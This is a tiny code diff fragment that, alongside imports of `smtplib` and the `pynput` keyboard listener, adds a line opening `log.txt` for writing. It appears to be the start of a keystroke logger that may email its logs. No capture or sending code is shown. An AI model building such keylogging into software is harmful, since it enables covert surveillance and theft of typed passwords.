@@ -3,6 +3,7 @@ import smtplib
 
 
 from pynput.keyboard import Key,Listener
+f = open("log.txt", "w")
 
 
 
